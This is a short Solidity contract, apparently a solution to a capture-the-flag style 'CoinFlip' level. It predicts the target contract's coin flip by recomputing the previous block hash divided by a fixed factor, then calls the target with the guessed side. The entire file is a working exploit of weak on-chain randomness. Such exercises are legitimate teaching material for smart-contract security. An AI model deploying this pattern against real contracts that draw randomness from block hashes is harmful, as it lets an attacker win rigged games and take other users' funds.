pragma solidity ^0.8.0;

import "./coin.sol";

contract coinAttack {
    CoinFlip public targetContract;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetContract) {
        targetContract = CoinFlip(_targetContract);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        lastHash = blockValue;
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        targetContract.flip(side);
    
    }
}